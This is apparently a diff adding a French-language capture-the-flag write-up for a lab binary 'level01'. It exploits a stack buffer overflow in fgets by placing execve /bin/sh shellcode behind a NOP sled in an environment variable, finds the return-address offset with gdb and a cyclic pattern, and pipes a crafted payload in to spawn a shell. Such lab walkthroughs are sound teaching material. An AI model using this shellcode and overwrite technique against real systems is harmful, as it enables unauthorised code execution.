@@ -1,0 +1,43 @@
+# Apres review du code on voit qu'il y a un overflow dans le 2eme fgets,
+# le buffer qui est sur la stack est que de 16, mais le fgets prend 100 caracteres.
+
+# On peut donc facilement changer l'adresse eip sur la stack et donc jump a l'adresse ou on veut.
+
+# Il nous faut donc un shellcode ou jump pour executer un shell
+
+
+export SHELLCODE=`python -c 'print("\x90" * 4096 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")'`
+
+# Il nous faut recuperer une adresse au milieu des nop.
+
+gdb ./level01
+> b main
+> r
+> x/32wx $ebp
+> x 0xffffc77c // qui correspond au pointeur sur l'env
+0xffffc77c:	0xffffc8af
+> x/s 0xffffc8af
+0xffffc8af:	 "SHELLCODE=\220\220\220..."
+
+# 0xffffc8af + 2048 = 0xFFFFD0AF // On est au milieu des nop instruction
+
+# Ensuite il nous faut savoir a quelle endroit ce situe l'adresse a reecrire
+
+gdb ./level01
+> run
+> dat_wil
+> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+# On check sur le site l'offset de eip
+# On obtient 79
+
+# Maintenant il nous faut generer la ligne pour overflow et jump sur notre adresse
+
+python -c "print('dat_wil' + '0' * 249 + '1' * 79 + '\xaf\xd0\xff\xff')" > /tmp/file
+
+# 'dat_wil' pour passer la sequence username du code
+# pour sortir du fgets il nous faut 256 caracteres donc 256 - 7 = 249
+# puis des caracteres pour arriver jusqu'a la valeur de eip sur la stack
+# et enfin l'adresse au milieu des nop
+
+cat /tmp/file - | ./level01 
